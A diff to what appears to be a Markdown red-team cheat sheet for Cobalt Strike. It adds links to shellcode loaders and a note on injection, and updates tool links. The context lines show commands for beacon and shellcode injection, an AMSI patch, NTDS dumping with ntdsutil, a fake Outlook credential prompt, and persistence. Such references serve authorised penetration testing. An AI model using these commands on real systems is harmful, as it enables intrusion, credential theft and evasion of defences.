@@ -33,13 +33,15 @@ A collection of tools used to generate new malleable C2 profiles to use with Cob
 - [SourcePoint](https://github.com/Tylous/SourcePoint)
 
 -----------------------------------------------------------------------------------------
-## Reflective Shellcode Loaders
+## Reflective Shellcode Loaders (UDRL)
 
 Shellcode loaders to add in Cobalt Strike before generating your shellcode which are used to reflectively generate shellcode for added obfuscation, encryption, and ultimately better evasion. 
 
 - [AceLdr](https://github.com/kyleavery/AceLdr)
 - [TitanLdr](https://github.com/benheise/TitanLdr)
 - [BokuLoader](https://github.com/boku7/BokuLoader) - Bobby Cooke's reflective loader
+- [ElusiveMice](https://github.com/mgeeky/ElusiveMice) - mgeeky
+- [OdinLdr](https://github.com/NtDallas/OdinLdr)
 
 -----------------------------------------------------------------------------------------
 ## Domain Enumeration
@@ -445,9 +447,10 @@ References:
 ## Defense Evasion
 
 ### Shellcode injection techniques
-Several methods here within Cobalt Strike or using BOFs
+Several methods here within Cobalt Strike or using BOFs<br />
+The default process injection in Cobalt Strike 4.11 has been updated to use "ObfSetThreadContext" ([blog post](https://www.cobaltstrike.com/blog/cobalt-strike-411-shh-beacon-is-sleeping))
 ```
-# Spawn a beacon into an existing process 
+# Spawn a beacon into an existing process using new novel injection technique (v4.11, 2025)
 inject <PID> <x86|x64> HTTPSLISTENER
 
 # Inject raw shellcode into an existing process
@@ -462,7 +465,7 @@ static_syscalls_shinject <PID> C:\beacon.bin
 syscalls_shspawn C:\beacon.bin
 ```
 
-### AMSI patch 
+### AMSI patch
 [BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit) for current process <br />
 `patchit amsi`
 
@@ -686,7 +689,7 @@ run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | 
 ```
 
 ### Credential Prompt
-[CredPrompt](https://github.com/guervild/BOFs/tree/dev/CredPrompt) to ask the current user for their username/password.
+[CredPrompt](https://github.com/guervild/BOFs/tree/dev/CredPrompt) BOF to ask the current user for their username/password.
 ```
 credprompt "Credentials are required to re-authenticate to Outlook:"
 ```
@@ -722,7 +725,7 @@ execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=H
 
 # Many other methods available on the tool's GitHub documentation
 ```
-[SharpPersist](https://github.com/fireeye/SharPersist)
+[SharpPersist](https://github.com/mandiant/SharPersist)
 ```
 # List persistence entries
 execute-assembly C:\SharPersist.exe -t [reg,schtaskbackdoor,startupfolder,service] -m list
@@ -757,6 +760,8 @@ bofnet_executeassembly AssemblyName argument1 argument2
 
 ------------------------------------------------------------------------------------------
 # References
+[Cobalt Strike official blog](https://www.cobaltstrike.com/blog)
+
 [Cobalt Strike commands cheat sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet) 
 
 [AD exploitation cheat sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) 
